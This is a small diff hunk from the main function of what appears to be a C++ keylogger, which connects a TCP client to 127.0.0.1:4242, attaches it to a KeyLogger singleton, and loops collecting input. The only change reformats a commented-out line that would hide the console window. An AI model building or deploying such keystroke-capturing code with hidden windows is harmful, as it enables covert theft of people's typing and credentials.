@@ -13,7 +13,7 @@ int main(int argc, char **argv)
 
 	client.connectToHost("127.0.0.1", "4242");
 	KeyLogger::getInstance().setTCPClient(&client);
-	//ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
+	// ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
 	timestamp = std::time(nullptr);
 	while (KeyLogger::getInstance().refreshNonBlocking())
 	{
